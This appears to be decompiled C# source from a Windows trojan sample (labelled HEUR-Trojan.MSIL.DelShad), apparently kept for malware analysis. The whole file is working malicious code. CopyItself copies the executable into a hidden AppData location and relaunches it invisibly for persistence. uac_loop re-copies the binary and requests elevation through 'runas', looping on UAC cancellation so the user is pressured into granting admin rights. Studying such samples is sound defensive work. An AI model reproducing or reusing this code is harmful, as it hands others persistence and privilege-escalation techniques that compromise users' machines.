// Decompiled with JetBrains decompiler
// Type: TimeTime.Utils
// Assembly: TimeTime, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0D3253C-BBDB-427F-A703-FC40F632671A
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b59981159bc996ae59dff2f70ee716815a7493468e808aa49bba00800d70a87d.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime
{
  internal class Utils
  {
    public static void CopyItself()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Settings.encryption_hiding_process;
      File.Copy(Application.ExecutablePath, str);
      new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = str,
          Arguments = "/a",
          WindowStyle = ProcessWindowStyle.Hidden,
          WorkingDirectory = Path.GetDirectoryName(str)
        }
      }.Start();
      Environment.Exit(0);
    }

    public static void uac_loop(string processName)
    {
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str2 = str1 + processName;
      ProcessStartInfo startInfo = new ProcessStartInfo(str2)
      {
        UseShellExecute = true,
        Verb = "runas",
        WindowStyle = ProcessWindowStyle.Normal,
        WorkingDirectory = str1,
        Arguments = "/x"
      };
      new Process().StartInfo = startInfo;
      if (!(friendlyName != processName) && !(location != str2))
        return;
      if (!File.Exists(str2))
      {
        File.Copy(friendlyName, str2);
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Utils.uac_loop(processName);
        }
      }
      else
      {
        try
        {
          File.Delete(str2);
          Thread.Sleep(200);
          File.Copy(friendlyName, str2);
        }
        catch
        {
        }
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode == 1223)
            Utils.uac_loop(processName);
        }
      }
    }
  }
}
